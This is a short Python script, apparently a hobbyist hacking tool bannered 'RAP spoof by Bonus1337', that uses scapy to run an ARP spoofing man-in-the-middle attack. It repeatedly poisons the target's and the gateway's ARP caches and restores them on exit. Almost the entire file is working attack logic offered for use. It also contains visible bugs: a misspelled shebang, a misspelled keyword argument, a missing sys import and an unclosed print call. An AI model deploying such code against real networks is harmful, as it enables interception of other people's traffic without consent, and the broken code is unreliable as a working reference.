#!/usr/bin/env pythin

#python2
import scapy.all as scapy
import time




def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac )
    scapy.send(packet, count=4, verbouse=False)


print("""
  _____            _____                           __          
 |  __ \     /\   |  __ \                         / _|         
 | |__) |   /  \  | |__) |  ___ _ __   ___   ___ | |_          
 |  _  /   / /\ \ |  ___/  / __| '_ \ / _ \ / _ \|  _|         
 | | \ \  / ____ \| |      \__ \ |_) | (_) | (_) | |           
 |_|  \_\/_/    \_\_|      |___/ .__/ \___/_\___/|_|___ ______ 
 | |           |  _ \          | |        /_ |___ \___ \____  |
 | |__  _   _  | |_) | ___  _ _|_|_   _ ___| | __) |__) |  / / 
 | '_ \| | | | |  _ < / _ \| '_ \| | | / __| ||__ <|__ <  / /  
 | |_) | |_| | | |_) | (_) | | | | |_| \__ \ |___) |__) |/ /   
 |_.__/ \__, | |____/ \___/|_| |_|\__,_|___/_|____/____//_/    
         __/ |                                                 
        |___/                                                  
"""

#write ip
target_ip = ""
#write ip
gateway_ip = ""
sent_packets_counts = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_counts = sent_packets_counts + 2
        print("\r[+] Sent two packets" + str(sent_packets_counts)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] detected CTRL + C .... Quitting")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)